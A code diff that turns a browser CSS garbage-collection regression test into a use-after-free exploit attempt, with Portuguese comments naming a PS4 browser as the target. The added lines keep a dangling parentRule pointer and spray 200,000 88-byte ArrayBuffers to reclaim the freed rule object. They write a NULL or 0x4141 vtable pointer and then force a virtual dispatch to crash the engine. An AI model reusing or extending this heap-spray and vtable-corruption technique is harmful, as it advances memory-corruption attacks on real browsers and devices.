@@ -4,16 +4,16 @@
 <script>
 function gc() {
     function gcRec(n) {
-          if (n < 1)
-              return {};
-          var temp = {i: "ab" + i + (i / 100000)};
-          temp += "foo";
-          gcRec(n-1);
+        if (n < 1) return {};
+        var temp = {i: "ab" + i + (i / 100000)};
+        temp += "foo";
+        gcRec(n-1);
     }
     for (var i = 0; i < 10000; i++)
-    gcRec(10);
+        gcRec(10);
 }
 
+// Fase 1: UAF setup (igual)
 const style = document.createElement("style");
 document.head.appendChild(style);
 const sheet = style.sheet;
@@ -27,7 +27,32 @@ const nested = nestedRules[0];
 nestedRules = null;
 gc();
 
-document.write(nested.parentRule === null ? "PASS" : "FAIL: parentRule is " + nested.parentRule);
+let danglingParent = nested.parentRule;
+document.write("Dangling: " + (danglingParent !== null) + "<br>");
+
+// Fase 2: Spray ArrayBuffer de exatamente 88 bytes
+// WTF::fastMalloc usa o mesmo pool que new CSSStyleRule
+// ArrayBuffer backing store de 88 bytes → mesmo bucket de 96 bytes
+let spray = [];
+for (let i = 0; i < 200000; i++) {
+    let buf = new ArrayBuffer(88);
+    let view = new DataView(buf);
+    // Sobrescrever offset 0 (onde vtable ptr estaria) com NULL
+    // → virtual dispatch → dereference NULL → SIGSEGV → crash PS4
+    view.setFloat64(0, 0.0, true); // 0x0000000000000000 no offset 0
+    // Ou para crash mais controlado:
+    // view.setBigUint64(0, 0x4141414141414141n, true); // "AAAAAAAA"
+    spray.push(buf);
+}
+
+// Fase 3: Se o chunk foi reusado, vtable[0] = 0x0 → crash no dispatch
+document.write("Tentando dispatch com vtable corrompida...<br>");
+try {
+    let result = danglingParent.selectorText; // virtual dispatch → crash se vtable = 0
+    document.write("Sem crash, resultado: " + result);
+} catch(e) {
+    document.write("EXCEPTION: " + e);
+}
 </script>
 </body>
 </html>
